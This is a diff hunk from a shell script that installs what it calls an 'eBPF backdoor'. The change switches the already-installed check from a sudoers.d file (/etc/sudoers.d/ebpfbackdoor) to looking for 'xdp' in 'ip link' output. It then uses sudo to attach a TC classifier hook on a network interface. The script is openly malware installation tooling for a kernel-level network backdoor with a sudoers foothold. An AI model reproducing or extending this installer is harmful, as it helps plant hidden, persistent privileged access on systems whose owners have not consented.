@@ -46,11 +46,12 @@ echo "*******************************************************\n"
 echo ""
 
 BACKDOOR_INSTALLED=0
-FILE=/etc/sudoers.d/ebpfbackdoor
-if test -f "$FILE"; then
+OUTPUT_COMM=$(/bin/sudo /usr/sbin/ip link)
+if [[ $OUTPUT_COMM == *"xdp"* ]]; then
    BACKDOOR_INSTALLED=1
    echo "Backdoor is already installed"
 else
+   #Install the programs
    echo -e "${BLU}Installing TC hook${NC}"
    /bin/sudo tc qdisc del dev enp0s3 clsact
    /bin/sudo tc qdisc add dev enp0s3 clsact
